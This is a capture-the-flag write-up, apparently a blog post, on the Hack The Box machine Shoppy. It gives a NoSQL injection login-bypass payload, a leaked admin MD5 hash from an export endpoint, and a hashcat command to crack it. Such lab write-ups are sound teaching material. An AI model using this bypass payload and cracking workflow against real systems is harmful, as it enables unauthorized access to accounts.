---
layout: post
title: "HTB: Shoppy"
subtitle: "NoSQL auth bypass, dump the admin hash, crack it, and move on from the panel"
date: 2023-02-02
tags: [htb, linux, nosql-injection, web, hashcat]
category: writeups
kind: machine
tldr: "shoppy.htb runs a Node app whose login is vulnerable to NoSQL injection. A payload like admin'||'1==1 bypasses auth, and an /exports search endpoint leaks the admin document with an MD5 password hash. Crack it with hashcat to log into the admin panel."
---

## recon

```
22    OpenSSH 8.4p1
80    nginx 1.23.1   "Shoppy Wait Page"
9093  Prometheus-style Go metrics endpoint
```

Content discovery finds `/login`, `/admin` (redirects to login), and `/exports`.

## NoSQL injection

The login is not SQL, it is Mongo-backed. Classic NoSQL auth bypass in the username:

```
admin'||'1==1
```

That logs in. The app also exposes a search export that returns raw documents:

```
GET /exports/export-search.json
[{"_id":"...","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"}]
```

## crack

The password is a plain MD5. Feed it to hashcat with rockyou:

```
$ hashcat -m 0 hash rockyou.txt
```

The cracked password opens the admin panel, which is the pivot into the rest of the box.
